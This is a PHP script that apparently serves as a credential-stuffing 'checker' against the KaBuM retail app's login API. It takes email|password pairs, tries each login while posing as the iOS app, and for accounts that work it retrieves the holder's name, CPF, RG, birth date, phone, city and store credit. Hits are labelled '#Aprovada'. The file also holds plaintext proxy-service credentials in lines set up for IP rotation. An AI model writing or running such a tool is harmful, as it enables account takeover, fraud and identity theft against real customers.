
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Brazil'; 
$proxy = 'isp2.hydraproxy.com:9989';


$random = rand(1000, 100000000); 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://servicespub.prod.api.aws.grupokabum.com.br/login/v1/usuario/session'); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_PROXY, $proxy); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
'Host: servicespub.prod.api.aws.grupokabum.com.br',
'Origin: app.kabum.com.br',
'Accept: */*',
'Content-Length: 0',
'Connection: close',
'FMAPP1029384756: app.kabum.com.br',
'Cookie: cors_bypass=56eb0ac8e8ec2634a3f1b9c88432327d',
'User-Agent: Kabum/2.12.8 (br.com.kabum; build:1.0.8800; iOS 12.5.4) Alamofire/5.4.3',
'Referer: app.kabum.com.br',
'Accept-Encoding: gzip, deflate',
'Accept-Language: pt-BR;q=1.0',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$d1 = curl_exec($ch);
$session = getStr($d1, '"session": "', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://servicespub.prod.api.aws.grupokabum.com.br/login/v1/usuario/login'); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_PROXY, $proxy); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
'Host: servicespub.prod.api.aws.grupokabum.com.br',
'Accept: */*',
'Accept-Language: pt-BR;q=1.0',
'Accept-Encoding: gzip, deflate',
'Content-Type: application/json',
'Origin: app.kabum.com.br',
'Connection: close',
'Referer: app.kabum.com.br',
'FMAPP1029384756: app.kabum.com.br',
'User-Agent: Kabum/2.12.8 (br.com.kabum; build:1.0.8800; iOS 12.5.4) Alamofire/5.4.3',
'Cookie: cors_bypass=56eb0ac8e8ec2634a3f1b9c88432327d',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","origem":311,"session":"'.$session.'","senha":"'.$senha.'"}');
$d2 = curl_exec($ch);
$id_cliente = getStr($d2, '"id_cliente": "', '"');
$retorno = getStr($d2, '"valido": ', ',');
$retorno = str_replace('false', 'password.incorrect', $retorno);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://servicespub.prod.api.aws.grupokabum.com.br/cliente/v2/cliente/enderecos?id_cliente='.$id_cliente.'&session='.$session.'&skipcache=1');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
'Host: servicespub.prod.api.aws.grupokabum.com.br',
'Origin: app.kabum.com.br',
'Accept: */*',
'Connection: close',
'FMAPP1029384756: app.kabum.com.br',
'Cookie: cors_bypass=56eb0ac8e8ec2634a3f1b9c88432327d',
'Accept-Language: pt-BR;q=1.0',
'Referer: app.kabum.com.br',
'Accept-Encoding: gzip, deflate',
'User-Agent: Kabum/2.12.8 (br.com.kabum; build:1.0.8800; iOS 12.5.4) Alamofire/5.4.3',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d3 = curl_exec($ch);
$cidade = getStr($d3, '"cidade": "', '"');
$estado = getStr($d3, '"estado": "', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://servicespub.prod.api.aws.grupokabum.com.br/cliente/v2/cliente?id_cliente='.$id_cliente.'&session='.$session.'');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: servicespub.prod.api.aws.grupokabum.com.br',
  'Origin: app.kabum.com.br',
  'Accept: */*',
  'Connection: close',
  'FMAPP1029384756: app.kabum.com.br',
  'Cookie: cors_bypass=56eb0ac8e8ec2634a3f1b9c88432327d',
  'Accept-Language: pt-BR;q=1.0',
  'Referer: app.kabum.com.br',
  'Accept-Encoding: gzip, deflate',
  'User-Agent: Kabum/2.12.8 (br.com.kabum; build:1.0.8800; iOS 12.5.4) Alamofire/5.4.3',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d4 = curl_exec($ch);
$cliente_nome = getStr($d4, '"cliente_nome": "', '",');
$cliente_cpf_cnpj = getStr($d4, '"cliente_cpf_cnpj": "', '",');
$cliente_rg_ie = getStr($d4, '"cliente_rg_ie": "', '",');
$cliente_nascimento = getStr($d4, '"cliente_nascimento": "', '",');
$cliente_telefone_02 = getStr($d4, '"cliente_telefone_02": "', '",');
$cliente_credito = getStr($d4, '"cliente_credito": ', ',');


     if(stristr($d2,'cliente_pnome') !== false){
        echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Nome: '.$cliente_nome.' | CPF: '.$cliente_cpf_cnpj.' | RG: '.$cliente_rg_ie.' | Nascimento: '.$cliente_nascimento.' | Telefone: ' .$cliente_telefone_02.' | Cidade: '.$cidade.'('.$estado.') | Credito: '.$cliente_credito.'<strong></strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
else{
        echo '               
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' → Retorno: '.$retorno.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';

}

curl_close($ch);
 ob_flush();        
                             
?>
